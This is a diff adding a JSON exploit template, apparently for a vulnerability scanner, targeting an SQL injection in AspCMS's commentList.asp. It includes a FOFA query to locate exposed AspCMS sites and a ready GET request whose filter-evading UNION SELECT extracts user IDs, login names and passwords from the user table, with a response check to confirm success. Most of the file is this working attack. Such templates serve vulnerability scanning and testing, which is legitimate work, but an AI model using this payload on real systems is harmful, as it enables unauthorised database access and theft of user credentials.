@@ -1,0 +1,33 @@
+{
+  "product": "AspCMS",
+  "vul_name": "AspCMS commentList.asp SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "AspCMS commentList.asp接口处存在SQL注入漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"ASPCMS\""
+  },
+  "protocol": "http",
+  "link": "https://download.csdn.net/blog/column/8086319/132880401",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/plug/comment/commentList.asp?id=-1 unmasterion semasterlect top 1 UserID,GroupID,LoginName,Password,1433223,null,1  frmasterom {prefix}user"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "：1433223"
+        }
+      ]
+    }
+  }
+}
